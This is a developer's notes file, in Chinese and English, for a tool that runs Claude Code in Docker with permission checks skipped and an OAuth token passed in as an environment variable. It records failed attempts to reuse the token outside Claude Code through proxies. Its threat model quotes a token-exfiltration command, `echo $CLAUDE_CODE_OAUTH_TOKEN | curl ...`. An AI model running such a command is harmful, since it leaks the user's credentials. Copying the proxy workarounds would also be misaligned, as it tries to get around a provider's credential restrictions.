# YOLO-CC - Claude Notes

## 目前狀態

- [x] Base Docker image (bun + Claude Code + non-root user)
- [x] docker-compose.yml with profile support
- [x] CLI script (bin/yolo-cc)
- [x] End-to-end 測試通過
- [ ] uv.Dockerfile 需要更新 (base image 改了)
- [ ] 移動到 ~/dotfiles/yolo-cc

## 重要發現

### OAuth Token 限制

Anthropic 的 OAuth token (`CLAUDE_CODE_OAUTH_TOKEN`) 有嚴格限制：

1. **只能在 Claude Code 內使用** - 直接 curl 到 `/v1/messages` 會被拒絕：
   ```
   "This credential is only authorized for use with Claude Code
   and cannot be used for other API requests."
   ```

2. **Proxy 方案行不通** - 即使用 mitmproxy 替換 token，Anthropic 伺服器端有額外驗證

3. **Token 可以 revoke** - 在 claude.ai/settings/account 的 "Active Connections" 可以撤銷

### 最終方案

**Option A: 直接傳 token 進 container (via env var)**

- Token 不會 persist 在 container filesystem
- 只存在 runtime memory
- Container 刪除後就消失
- 比 Anthropic gVisor 差，但比存檔案好

### 為什麼不用 Proxy

嘗試過的方案：
1. `ANTHROPIC_BASE_URL` - CC 似乎不 respect 這個 env var
2. `HTTP_PROXY` + mitmproxy - CC 會用，但 token 被伺服器端拒絕
3. 自製 auth-proxy - 同上，token 驗證失敗

結論：Anthropic 有伺服器端驗證，不是單純 header 問題。

### 為什麼需要 non-root user

CC 的 `--dangerously-skip-permissions` 拒絕在 root 下執行：
```
--dangerously-skip-permissions cannot be used with root/sudo privileges for security reasons
```

### bun vs npm 安裝

- `bun install -g` 在 non-root user 下有 linking 權限問題
- `npm install -g` 配合 `npm config set prefix` 可以正常運作

## 踩過的坑

1. **ANTHROPIC_BASE_URL 無效** - CC 不 redirect 到自訂 URL
2. **mitmproxy token injection 無效** - 伺服器端驗證
3. **/root/.bun 權限問題** - 改用 npm 解決
4. **Container 預設 root** - 需要建立 non-root user

## 技術細節

### 檔案結構
```
yolo-cc/
├── bin/yolo-cc         # CLI entrypoint
├── compose/
│   └── docker-compose.yml
├── images/
│   ├── base.Dockerfile
│   └── uv.Dockerfile   # TODO: 需要更新
├── proxy/              # 廢棄，保留研究用
│   ├── auth-proxy.ts
│   ├── smart-proxy.ts
│   ├── capture-proxy.ts
│   └── token_injector.py
└── CLAUDE.md           # 這個檔案
```

### 使用方式
```bash
export CLAUDE_CODE_OAUTH_TOKEN="sk-ant-oat01-..."
cd /path/to/project
yolo-cc "your prompt here"
yolo-cc --uv "create FastAPI server"  # 需要先更新 uv.Dockerfile
```

## 下一步

1. 更新 uv.Dockerfile 使用新的 base image
2. 移動到 ~/dotfiles/yolo-cc
3. 加到 PATH (`~/.zshrc` 或 `~/.aliases`)
4. [可選] 加 npm/playwright profiles

## 安全考量

### 風險
- Prompt injection 可能讓 CC 執行 `echo $CLAUDE_CODE_OAUTH_TOKEN | curl ...`
- 但 token 只能用於 CC，偷了也不能 raw API abuse

### 緩解
- Token 可以隨時在 claude.ai/settings revoke
- Container 刪除後 token 不 persist
- `.git` mount 為 read-only，可以 git restore 恢復
